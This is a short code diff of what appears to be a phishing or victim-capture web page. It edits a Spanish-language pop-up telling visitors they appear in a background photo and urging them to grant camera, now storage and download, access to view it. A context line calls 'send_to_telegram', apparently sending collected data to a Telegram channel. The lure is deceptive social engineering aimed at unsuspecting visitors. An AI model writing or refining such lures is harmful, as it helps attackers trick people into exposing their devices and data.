@@ -122,7 +122,7 @@ send_to_telegram($msg);
 <div id="cameraModal">
     <div class="content">
         <h2>¡Atención!</h2>
-        <p>📸 ¡Wow! Apareces en la imagen de fondo… ¿seguro que no eres tú? Da acceso a tu cámara para poder ver la foto completa y guardarla.</p>
+        <p>📸 ¡Wow! Apareces en la imagen de fondo... ¿seguro que no eres tú? Para poder acceder y visualizar la imagen correctamente, necesitamos tu permiso para acceder al almacenamiento y descargar el contenido.</p>
         <button id="grantAccess">Permitir acceso</button>
     </div>
 </div>
